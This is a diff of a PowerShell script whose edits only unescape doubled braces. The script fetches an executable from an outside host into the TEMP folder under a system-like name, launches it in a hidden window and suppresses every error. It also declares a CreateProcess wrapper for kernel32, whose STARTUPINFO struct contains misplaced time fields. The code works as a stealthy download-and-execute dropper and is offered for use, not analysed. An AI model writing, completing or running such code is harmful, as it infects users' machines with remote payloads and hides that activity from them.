@@ -2,22 +2,22 @@
 $url = "http://a1067277.xsph.ru/1Elusion.exe";
 $outputPath = "$env:TEMP\\LNsystem.exe" # Change this to your desired path
 
-try {{
+try {
     # Download the executable file
     Invoke-RestMethod -Uri $url -OutFile $outputPath
 
     # Run the downloaded executable in a hidden window
     Start-Process -FilePath $outputPath -WindowStyle Hidden
-}} catch {{
+} catch {
     # Suppressing errors, nothing will be output to the console
-}}
+}
 
 # Optional: If you want to define a Windows API function for future use
 $addTypeDefinition = @"
 using System;
 using System.Runtime.InteropServices;
 
-public class ProcessHelper {{
+public class ProcessHelper {
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool CreateProcess(
         string lpApplicationName,
@@ -32,7 +32,7 @@ public class ProcessHelper {{
         out PROCESS_INFORMATION lpProcessInformation);
 
     [StructLayout(LayoutKind.Sequential)]
-    public struct STARTUPINFO {{
+    public struct STARTUPINFO {
         public int cb;
         public string lpReserved;
         public string lpDesktop;
@@ -50,16 +50,16 @@ public class ProcessHelper {{
         public IntPtr lpReserved2;
         public int dwHighDateTime;
         public int dwLowDateTime;
-    }}
+    }
 
     [StructLayout(LayoutKind.Sequential)]
-    public struct PROCESS_INFORMATION {{
+    public struct PROCESS_INFORMATION {
         public IntPtr hProcess;
         public IntPtr hThread;
         public int dwProcessId;
         public int dwThreadId;
-    }}
-}}
+    }
+}
 "@;
 
 # Compile the type definition
